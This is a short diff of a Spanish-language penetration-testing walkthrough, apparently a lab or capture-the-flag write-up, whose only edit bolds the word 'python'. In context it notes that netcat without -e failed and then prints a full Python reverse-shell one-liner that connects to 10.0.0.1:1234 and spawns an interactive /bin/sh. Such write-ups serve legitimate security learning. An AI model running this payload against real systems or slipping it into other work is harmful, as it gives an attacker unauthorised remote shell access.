@@ -104,7 +104,7 @@ Probamos otra opción, que es hacer uso de netcat pero sin la opción -e.
 
 Y tampoco llega a producirse la conexión.
 
-Usaremos esta con python:
+Usaremos esta con **python**:
 
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
